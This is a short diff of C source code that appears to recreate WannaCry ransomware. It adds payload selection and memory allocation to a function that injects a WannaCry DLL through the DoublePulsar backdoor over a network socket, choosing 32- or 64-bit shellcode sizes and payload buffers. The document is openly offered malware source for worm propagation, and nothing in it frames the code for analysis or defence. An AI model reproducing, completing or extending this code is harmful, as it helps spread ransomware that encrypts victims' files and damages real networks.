@@ -38,8 +38,29 @@ int i;
 int offset;
 unsigned char signature[12]; //dunno why Wannacry lists this variable with 9
 
+char *hMem;
+char *payload;
+const void *payload_exe_buffer;
+
 int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
 {
+	
+	if ( architectureType )
+	  {
+	    payload_exe_buffer = *(const void **)&ThisExecutableReadIntoMemoryBufferFromDisk_x86;
+	    sizeOfshellcode = 4869;
+	    payload = (char *)&DLLPayload32;
+	  }
+	  else
+	  {
+	    payload_exe_buffer = *(const void **)&ThisExecutableReadIntoMemoryBufferFromDisk_x64;
+	    sizeOfshellcode = 6144;
+	    payload = (char *)&DLLPayload64;
+	  }
+	  hMem = GlobalAlloc(GPTR, (SIZE_T)&payload[sizeOfshellcode + 12]);
+	
+	
+	
 	if ( TotalSizeOfPayload / 4096 > 0 )
 	    {
 	      for ( i = 0; ; offset = i )
